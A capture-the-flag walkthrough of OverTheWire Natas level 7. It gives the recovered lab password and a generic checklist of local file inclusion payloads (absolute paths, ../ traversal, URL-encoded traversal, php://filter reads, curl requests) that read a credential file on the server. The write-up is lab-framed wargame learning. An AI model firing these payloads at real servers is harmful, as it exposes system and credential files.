# 🔐 Natas Level: Natas6--->Natas7



### 📂 Execution Process 

👉 
- Right Click to Inspect
<img width="1470" height="956" alt="Screenshot 2025-09-29 at 2 28 45 PM" src="https://github.com/user-attachments/assets/7d538980-4783-4164-a0b3-ef1d8c879745" />

- use http://natas7.natas.labs.overthewire.org/?page=/etc/natas_webpass/natas8
<img width="1470" height="956" alt="Screenshot 2025-09-29 at 2 28 11 PM" src="https://github.com/user-attachments/assets/4f8f701c-da13-42a3-93b1-b5f122a20bbe" />



### 📄 Password found:
👉 
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

### NOTES

# What you tried and what it means
You used:
?page=/etc/natas_webpass/natas8

Simple meaning:
You told the web server to show the file /etc/natas_webpass/natas8.  
If the website directly includes files from the path given by page, it will show you that file.  
That file contains the password for the next level (natas8).

# Common ways to read that file (easy steps)

## 1) Direct include (what you tried)
If the site allows it, this will work:
http://HOST/?page=/etc/natas_webpass/natas8

Replace HOST with the actual address (example: natas7.natas.labs.overthewire.org).

## 2) Directory traversal (when direct absolute path fails)
Some sites only allow relative includes. You use ../ to go up folders and reach /etc:

http://HOST/?page=../../../../etc/natas_webpass/natas8

Try more or fewer ../ depending on how deep the app folder is.
If server blocks ../, you can URL-encode it:

http://HOST/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fnatas_webpass%2fnatas8

## 3) php://filter (if file content is not shown plainly)
If the server tries to execute or hide included PHP files, php://filter reads the file and outputs it encoded in base64. Then you decode locally.

http://HOST/?page=php://filter/convert.base64-encode/resource=/etc/natas_webpass/natas8

If result looks like random letters, copy it and decode with a base64 decoder.

To decode on your computer:
echo "BASE64TEXT" | base64 --decode
Replace BASE64TEXT with the long string you got.

## 4) Use curl if site needs basic auth or for quick testing
If you need to supply the current level username and password (for example natas7:CURRENT_PASSWORD) use:
curl -s -u natas7:CURRENT_PASSWORD "http://HOST/?page=/etc/natas_webpass/natas8"

This prints the page output. If you used php://filter above and got base64, decode it using the echo | base64 --decode command shown earlier.

## 5) POST forms (sometimes the parameter is in POST, not GET)
If the site uses a form that posts page or file, try:
curl -s -u natas7:CURRENT_PASSWORD -d "page=/etc/natas_webpass/natas8" "http://HOST/vulnerable.php"

# Quick comparison table

| Problem you see | Try this first | Why |
|---|---|---|
| Page shows the file content | ?page=/etc/natas_webpass/natas8 | Direct include works |
| Nothing / error / file not found | ?page=../../../../etc/natas_webpass/natas8 | Use directory traversal |
| Page shows weird binary or code executed | ?page=php://filter/convert.base64-encode/resource=/etc/natas_webpass/natas8 | Forces file to be returned as base64 text |
| Requires login or hidden behind auth | curl -u natas7:CURRENT_PASSWORD "http://HOST/?page=..." | Sends credentials automatically |
| Form uses POST | curl -d "page=/etc/natas_webpass/natas8" "http://HOST/..." | Sends parameter in POST instead of GET |

# Example full workflow (copy-paste friendly)

1. Try direct include:
http://natas7.natas.labs.overthewire.org/?page=/etc/natas_webpass/natas8

2. If not visible, try traversal:
http://natas7.natas.labs.overthewire.org/?page=../../../../etc/natas_webpass/natas8

3. If still not working, try php filter:
http://natas7.natas.labs.overthewire.org/?page=php://filter/convert.base64-encode/resource=/etc/natas_webpass/natas8

4. If it returns base64 text, decode locally:
echo "PASTE_BASE64_TEXT_HERE" | base64 --decode

5. If site needs basic auth (replace CURRENT_PASSWORD):
curl -s -u natas7:CURRENT_PASSWORD "http://natas7.natas.labs.overthewire.org/?page=/etc/natas_webpass/natas8"

# Small notes and tips
- If the site replaces ../ or blocks it, try encoding .. and / as %2e%2e and %2f.
- Always check page source to find parameter names (maybe not page but file or inc).
- If you get HTML but the file is inside HTML, look for the password text inside the HTML source.
- If you get permission denied or blank, the server might block reading /etc. Try other tricks or a different parameter.
- Always use these only in the lab (like OverTheWire / Natas). Doing this on real websites without permission is illegal.

# Checklist you can follow (copy and use)
1. Try: http://HOST/?page=/etc/natas_webpass/natas8
2. Try traversal: http://HOST/?page=../../../../etc/natas_webpass/natas8
3. Try php filter: http://HOST/?page=php://filter/convert.base64-encode/resource=/etc/natas_webpass/natas8
4. If base64 -> echo "BASE64" | base64 --decode
5. If auth needed -> curl -s -u natas7:CURRENT_PASSWORD "http://HOST/?page=..."
6. If POST needed -> curl -s -u natas7:CURRENT_PASSWORD -d "page=/etc/natas_webpass/natas8" "http://HOST/..."
